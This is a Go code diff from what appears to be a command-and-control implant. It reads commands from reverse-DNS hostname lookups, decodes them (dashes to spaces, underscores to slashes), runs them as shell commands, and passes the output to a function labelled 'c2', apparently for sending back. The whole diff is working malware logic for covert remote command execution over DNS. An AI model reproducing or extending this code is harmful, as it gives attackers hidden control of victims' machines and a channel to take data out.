@@ -58,11 +58,15 @@ func resolveCommand(host []string, bl *int) {
 		case trigger_mappings["bash"]:
 			// https://www.sohamkamani.com/golang/exec-shell-command/
 			var mode string = "c2"
-			bash_command := sections[2]
-			cmd := exec.Command(string(bash_command))
+			bash_command_sections := strings.Split(sections[2], "-")
+			bash_command := strings.Join(bash_command_sections, " ")
+			bash_command = strings.Replace(bash_command, "_", "/", -1)
+			bash_command_sections = strings.Split(bash_command, " ")
+
+			cmd := exec.Command(bash_command_sections[0], bash_command_sections[1])
 			out, err := cmd.Output()
 			if err != nil {
-				fmt.Println(err)
+				fmt.Printf("Error: %v\n", err)
 			}
 			output_bytes := append([]byte("beg"), out...)
 			begin_comm(&output_bytes, bl, &mode)
@@ -85,6 +89,9 @@ func resolveAddr(address string, bl *int) {
 		},
 	}
 	host, _ := r.LookupAddr(context.Background(), address)
+	// if err != nil {
+	// 	fmt.Println(err)
+	// }
 	if len(host) > 0 {
 		resolveCommand(host, bl)
 	}
